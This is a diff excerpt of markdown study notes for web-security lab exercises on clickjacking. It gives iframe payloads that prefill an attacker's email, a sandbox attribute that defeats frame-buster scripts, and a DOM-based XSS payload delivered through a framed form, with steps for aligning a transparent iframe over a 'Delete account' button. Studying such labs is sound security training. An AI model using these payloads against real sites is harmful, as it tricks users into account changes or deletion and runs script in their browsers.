@@ -2372,13 +2372,13 @@ Content-Type: application/json
   - Substitute suitable pixel values for the **$height_value** and **$width_value** variables of the iframe (we suggest 700px and 500px respectively).   
   - Substitute suitable pixel values for the **$top_value** and **$side_value** variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).   
   - Set the **opacity** value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1.	  
-- Clickjacking with form input data prefilled from a URL parameter  
+- Clickjacking with form input data prefilled from a **URL parameter**  
   `<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`  			
 - Clickjacking with a **frame buster** script  
   `<iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`			
-- Exploiting clickjacking vulnerability to trigger DOM-based XSS  
+- Exploiting clickjacking vulnerability to trigger **DOM-based XSS**  
   `<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>`  	
-- Multistep clickjacking
+- **Multistep** clickjacking
   - Delete account" button and the "Test me first
   - "Yes" button on the confirmation page
     ```
